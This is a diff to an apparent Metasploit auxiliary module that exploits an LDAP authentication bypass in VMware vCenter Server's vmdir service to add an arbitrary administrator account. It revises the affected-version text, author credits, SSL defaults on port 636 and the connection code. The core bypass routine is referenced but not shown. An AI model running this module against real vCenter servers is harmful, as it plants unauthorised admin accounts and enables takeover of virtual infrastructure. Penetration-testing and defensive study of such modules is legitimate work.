@@ -16,10 +16,11 @@ class MetasploitModule < Msf::Auxiliary
         'Description' => %q{
           This module bypasses LDAP authentication in VMware vCenter Server's
           vmdir service to add an arbitrary administrator user. Version 6.7
-          prior to the 6.7U3f update is vulnerable.
+          prior to the 6.7U3f update is vulnerable, only if upgraded from a
+          previous release line, such as 6.0 or 6.5.
         },
         'Author' => [
-          # Discovered by unknown researcher(s)
+          'Hynek Petrak', # Discovery
           'JJ Lehmann', # Analysis and PoC
           'Ofri Ziv', # Analysis and PoC
           'wvu' # Module
@@ -32,10 +33,11 @@ class MetasploitModule < Msf::Auxiliary
         'DisclosureDate' => '2020-04-09', # Vendor advisory
         'License' => MSF_LICENSE,
         'Actions' => [
-          ['Add', 'Description' => 'Add an admin user']
+          ['Add', { 'Description' => 'Add an admin user' }]
         ],
         'DefaultAction' => 'Add',
         'DefaultOptions' => {
+          'SSL' => true,
           'CheckModule' => 'auxiliary/gather/vmware_vcenter_vmdir_ldap'
         },
         'Notes' => {
@@ -46,13 +48,10 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
+      Opt::RPORT(636), # SSL/TLS
       OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
       OptString.new('USERNAME', [false, 'Username of admin user to add']),
       OptString.new('PASSWORD', [false, 'Password of admin user to add'])
-    ])
-
-    register_advanced_options([
-      OptFloat.new('ConnectTimeout', [true, 'Timeout for LDAP connect', 10.0])
     ])
   end
 
@@ -94,13 +93,7 @@ class MetasploitModule < Msf::Auxiliary
       @base_dn = checkcode.reason
     end
 
-    opts = {
-      host: rhost,
-      port: rport,
-      connect_timeout: datastore['ConnectTimeout']
-    }
-
-    Net::LDAP.open(opts) do |ldap|
+    ldap_connect do |ldap|
       print_status("Bypassing LDAP auth in vmdir service at #{peer}")
       auth_bypass(ldap)
 
